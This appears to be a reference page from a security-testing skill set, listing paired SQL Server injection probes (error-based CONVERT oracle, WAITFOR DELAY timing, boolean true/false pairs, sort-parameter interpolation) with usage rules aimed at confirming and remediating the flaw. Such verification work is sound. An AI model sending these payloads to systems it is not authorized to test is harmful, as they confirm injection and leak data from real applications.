# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`sql-injection-mssql-variants`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `sql-injection-mssql-variants`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Conversion-error oracle

**Expected differential:** a CAST of a subquery to int raises a SQL Server conversion error embedding the value while the benign literal does not

```text
id=5 AND 1=CONVERT(int,(SELECT @@version))
id=5 AND 1=CONVERT(int,5)
```

### WAITFOR timing

**Expected differential:** the delayed branch adds the specified seconds while the zero branch matches baseline, repeated to clear jitter

```text
id=5; IF(1=1) WAITFOR DELAY '0:0:5'--
id=5; IF(1=1) WAITFOR DELAY '0:0:0'--
```

### Boolean row-count pair

**Expected differential:** the true predicate returns the normal set and the false predicate returns none, with identical request shape

```text
q=a' AND 1=1--
q=a' AND 1=2--
```

### Identifier-slot map probe

**Expected differential:** an unknown sort token is rejected while a known one orders rows; acceptance of an arbitrary token proves interpolation

```text
sort=created_at&top=10
sort=__unknown__&top=10
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
